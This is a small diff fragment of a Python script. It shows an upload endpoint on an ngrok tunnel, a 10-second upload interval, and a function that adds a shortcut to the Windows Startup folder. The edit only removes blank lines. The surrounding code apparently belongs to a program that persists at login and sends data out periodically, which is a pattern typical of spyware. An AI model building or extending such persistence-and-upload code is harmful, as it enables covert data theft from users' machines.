@@ -17,9 +17,6 @@ import win32com.client
 SERVER_URL = "https://fa115edfbcb3.ngrok-free.app/upload"
 UPLOAD_INTERVAL = 10
 
-
-
-
 def create_startup_shortcut(exe_path):
     
     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
